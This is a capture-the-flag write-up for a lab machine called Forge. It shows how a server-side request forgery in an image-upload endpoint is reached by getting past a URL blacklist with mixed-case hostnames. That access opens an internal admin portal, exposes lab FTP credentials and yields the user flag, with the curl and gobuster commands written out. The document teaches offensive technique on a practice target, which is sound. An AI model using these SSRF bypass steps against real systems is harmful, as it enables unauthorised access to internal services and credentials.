## Info
### Credential
 User | Password           | Service | Note
------|--------------------|---------|------
user  |heightofsecurity123!|FTP      |

## Path
### User
1. Got redirected to `forge.htb`, so added that to `/etc/hosts`.
2. When requesting a URL that doesn't serve http service, it showed the following error. From the error message, we could assume the backend was running python.
```
An error occured! Error : HTTPConnectionPool(host='10.10.17.87', port=80): Max retries exceeded with url: /index.html (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f4cdca7f730>: Failed to establish a new connection: [Errno 111] Connection refused'))
```
3. By using uppercase, I bypassed the blacklist of the URL and could request to the local of the host. Since the FTP got filtered on `nmap`, I tried and found FTP was running locally.
```
$ curl http://forge.htb/upload -X POST -d 'url=http://ForGe.HTB:21/&remote=0'
<strong>An error occured! Error : (&#39;Connection aborted.&#39;, BadStatusLine(&#34;220 Forge&#39;s internal ftp server\r\n&#34;))</strong>
```
4. After testing, the upload page seemed cannot do much, so I turned back to do more enumeration. And I found the subdomain `admin.forge.htb`.
```
$ gobuster vhost -u http://forge.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o vhost.gobuster
$ grep -v 302 vhost.gobuster
Found: admin.forge.htb (Status: 200) [Size: 27]
```
5. When visiting `admin.forge.htb`, it said `Only localhost is allowed!`. We could reach it using step 3 method. The script `ssrf.py` showed the result.
```
[path]> /
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
``` 
6. Visiting `/announcements` through SSRF, it gave us the credential of the FTP server.
```
[path]> /announcements
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
```
7. Followed the instruction in `/announcements`, I requested to the internal FTP server and got the user flag.
```
[path]> http://admin.foRge.Htb/upload?u=ftp://user:heightofsecurity123!@Forge.Htb/
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 11 21:36 user.txt
```


